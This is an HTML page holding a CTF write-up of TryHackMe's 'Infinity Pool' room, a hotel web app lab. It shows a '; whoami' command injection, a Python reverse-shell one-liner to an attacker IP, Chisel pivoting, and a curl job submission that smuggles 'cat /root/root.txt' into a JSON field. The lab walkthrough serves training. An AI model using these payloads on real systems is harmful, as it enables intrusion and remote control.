@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>infinity_pool · hackerholidays</title>
+<meta name="description" content="CTF writeup: infinity_pool (hackerholidays)" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css" />
+<link rel="stylesheet" href="../../css/pygments.css" />
+</head>
+<body>
+<div class="blueprint-grid" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="topbar__inner">
+    <a class="topbar__brand" href="../../index.html">
+      <span class="brand-mark">CTF</span>
+      <span class="brand-text">Writeups</span>
+    </a>
+    <div class="topbar__spacer"></div>
+    <div class="topbar__actions">
+      <a class="btn btn--ghost btn--small" href="https://aaadarsh1337.github.io/">&#8592; Portfolio</a>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups" target="_blank" rel="noopener">Repo &#8599;</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<div class="reader-layout reader-layout--static">
+  <aside class="sidebar">
+    <div class="sidebar__head">
+      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
+    </div>
+    <div class="sidebar__challenge">
+      <p class="tb-label">CHALLENGE</p>
+      <h2>infinity_pool</h2>
+      <p class="side-path">hackerholidays</p>
+    </div>
+    <div class="sidebar__files">
+      <p class="tb-label">FILES</p>
+      <div class="file-list"><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/basicscan" target="_blank" rel="noopener"><span class="name">basicscan</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/exploit1.py" target="_blank" rel="noopener"><span class="name">exploit1.py</span><span class="kind">py</span></a><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/fullscan" target="_blank" rel="noopener"><span class="name">fullscan</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/notes.md" target="_blank" rel="noopener"><span class="name">notes.md</span><span class="kind">md</span></a></div>
+    </div>
+    <div class="sidebar__foot">
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/tree/main/hackerholidays/infinity_pool" target="_blank" rel="noopener">Open folder &#8599;</a>
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/notes.md" target="_blank" rel="noopener">View markdown &#8599;</a>
+    </div>
+  </aside>
+  <article class="reader">
+    <div class="reader__toolbar">
+      <div class="reader__crumb">
+        <span class="tb-label">READING</span>
+        <span>notes.md</span>
+      </div>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/infinity_pool/notes.md" target="_blank" rel="noopener">Source &#8599;</a>
+    </div>
+    <div class="reader__body">
+      <div class="md-render">
+<h1 id="day-11-infinity-pool">Day 11 - Infinity Pool</h1>
+<h2 id="room-httpstryhackmecomroomhh-infinitypool-5b3548af">Room: <a href="https://tryhackme.com/room/hh-infinitypool-5b3548af">https://tryhackme.com/room/hh-infinitypool-5b3548af</a></h2>
+<p>Hello Hackers!</p>
+<p>Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups.</p>
+<p>The initial clue suggests that something is hidden from normal visitors:</p>
+<blockquote>
+<p><code>Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.</code></p>
+</blockquote>
+<p>Checking <code>robots.txt</code> revealed two disallowed paths:</p>
+<div class="highlight"><pre><span></span><code>User-agent: *
+Disallow: /internal/
+Disallow: /status
+</code></pre></div>
+
+<p>Reviewing <code>app.js</code> revealed an internal endpoint:</p>
+<div class="highlight"><pre><span></span><code>// Byte Lotus front-end bootstrap.
+// TODO(ops): the staff connectivity tool at /status posts to the legacy
+// /internal/netcheck handler. Keep it out of the public nav until the new
+// auth gateway ships. Disallowed in robots.txt for now.
+console.log("Stay Noticed™");
+</code></pre></div>
+
+<p>The <code>/internal/netcheck</code> endpoint was vulnerable to command injection. Testing it with:</p>
+<div class="highlight"><pre><span></span><code>; whoami
+</code></pre></div>
+
+<p>returned:</p>
+<div class="highlight"><pre><span></span><code>web
+ping: usage error: Destination address required
+</code></pre></div>
+
+<p>We then used a Python reverse shell:</p>
+<div class="highlight"><pre><span></span><code>; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.188.174",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+</code></pre></div>
+
+<p>This gave us a shell and allowed us to retrieve the user flag:</p>
+<blockquote>
+<p><code>THM{...}</code></p>
+</blockquote>
+<p>Next, we ran <code>linpeas.sh</code> to check for privilege escalation opportunities. Several interesting services were running on ports <code>8080</code>, <code>9000</code>, and <code>3000</code>.</p>
+<p>We used Chisel to pivot to the internal services.</p>
+<p>On the target:</p>
+<div class="highlight"><pre><span></span><code>./chisel_1.11.8_linux_amd64<span class="w"> </span>client<span class="w"> </span><span class="m">192</span>.168.188.174:8000<span class="w"> </span>R:8080:localhost:8080
+</code></pre></div>
+
+<p>On Kali:</p>
+<div class="highlight"><pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>--port<span class="w"> </span><span class="m">8000</span><span class="w"> </span>--reverse
+</code></pre></div>
+
+<p>We then opened <code>localhost:8080</code> in the browser and found an Apache site with an <code>/admin</code> endpoint.</p>
+<p>The internal API on port <code>3000</code> exposed configuration details:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>localhost:3000/api/config
+</code></pre></div>
+
+<p>The response revealed the telephony portal credentials:</p>
+<div class="highlight"><pre><span></span><code>FreePBXUCPTemplateCreator:St4yN0t1c3d_2026
+</code></pre></div>
+
+<p>We logged in to the portal on port <code>8080</code> using these credentials. After adding the voicemail widget, we obtained the automation key:</p>
+<div class="highlight"><pre><span></span><code>cc_auto_7b3f9a1c4e0d2f6a
+</code></pre></div>
+
+<p>The automation service was running on port <code>9000</code>. We used the key to submit a job with command injection:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">'{"report":"test;cat /root/root.txt;#"}'</span>
+</code></pre></div>
+
+<p>This retrieved the root flag:</p>
+<blockquote>
+<p><code>THM{...}</code></p>
+</blockquote>
+<p>Happy Hacking!</p>
+      </div>
+    </div>
+  </article>
+</div>
+
+</main>
+</body>
+</html>
